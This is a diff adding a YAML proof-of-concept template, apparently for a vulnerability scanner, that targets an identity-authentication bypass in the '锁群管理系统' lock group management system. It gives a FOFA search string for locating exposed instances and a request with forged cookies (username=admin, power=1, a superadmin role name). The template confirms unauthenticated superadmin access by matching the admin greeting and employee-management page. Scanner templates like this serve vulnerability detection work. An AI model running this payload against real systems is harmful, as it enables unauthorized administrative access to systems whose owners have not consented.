@@ -1,0 +1,21 @@
+id: poc-yaml-lgms-identity-authentication-bypass
+info:
+  name: 锁群管理系统 身份认证绕过漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 锁群管理系统
+  fofa: title=="锁群管理系统 V2.0"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"您好！ <span>")
+- method: GET
+  path: /
+  headers:
+    Cookie: ASP.NET_SessionId=evadd1jksrepp4gtbgockcbi; username=admin; power=1; powerName=%e8%b6%85%e7%ba%a7%e7%ae%a1%e7%90%86%e5%91%98;
+      code=admin
+  expression: status_code == 200 && ( contains(body,"您好！admin [超级管理员] <span>") ||
+    contains(body,"您好！系统管理员 [超级管理员] <span>") ) && contains(body,"锁群管理系统") && contains(body,"员工管理")
+variables: {}
+transport: http
